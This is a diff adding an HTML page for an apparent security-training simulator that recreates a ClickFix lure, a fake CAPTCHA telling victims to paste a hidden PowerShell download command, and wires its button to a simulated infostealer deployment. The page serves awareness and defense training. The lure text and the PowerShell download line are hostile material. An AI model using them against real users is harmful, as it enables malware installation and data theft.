@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Confirm you are human</title>
+  <link rel="stylesheet" href="/theme/theme.css">
+</head>
+<body class="accent-phish">
+  <div class="hero">
+    <h1>⚠ ClickFix simulation</h1>
+    <p>This page shows the social-engineering pattern attackers use to make victims run malicious commands. Nothing here harms your machine.</p>
+  </div>
+
+  <div class="wrap" style="max-width:760px">
+    <div class="clickfix-dialog">
+      <div class="dlg-title">🔒 Verify you are human</div>
+      <div class="dlg-body">
+        <p><b>Confirm that you are not a robot</b> by completing these steps:</p>
+        <ol>
+          <li>Press <b>Windows key + R</b></li>
+          <li>Copy and paste the verification command below</li>
+          <li>Press <b>Enter</b> and wait 3 seconds</li>
+        </ol>
+        <div class="codebox" style="background:#f6f8fa;color:#0d1117;border-color:#d0d7de">
+          powershell -w hidden -c (New-Object Net.WebClient).DownloadString('{{ phish_origin }}/a')
+        </div>
+      </div>
+      <div class="dlg-footer">
+        <button class="win" onclick="simulate()">I have completed the steps</button>
+        <button class="win secondary" onclick="simulate()">Verify later</button>
+      </div>
+    </div>
+
+    <div class="banner sim" id="status">
+      <b>DEMO:</b> In a real ClickFix attack, the command downloads and runs malware
+      (here: the simulated Lumma infostealer). Pressing the button simulates the victim
+      running it — safely, inside the endpoint simulator.
+    </div>
+  </div>
+  <div class="sim-ribbon">DEMO / SIMULATION</div>
+  <script>
+  async function simulate() {
+    const s = document.getElementById('status');
+    s.className = 'banner info';
+    s.innerHTML = '<b>Simulating…</b> the victim ran the command. Watch the C2 console, the EDR and the SOC.';
+    const r = await fetch('/api/clickfix/deploy', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({user: 'alex@northwind.demo'})
+    });
+    const d = await r.json().catch(() => ({}));
+    if (r.ok) {
+      s.className = 'banner success';
+      s.innerHTML = '<b>Verification complete ✔</b> — in reality, the infostealer is now running on the workstation.';
+    } else {
+      s.className = 'banner error';
+      s.innerHTML = 'Simulated infection failed: ' + (d.error || 'unknown');
+    }
+  }
+  </script>
+</body>
+</html>
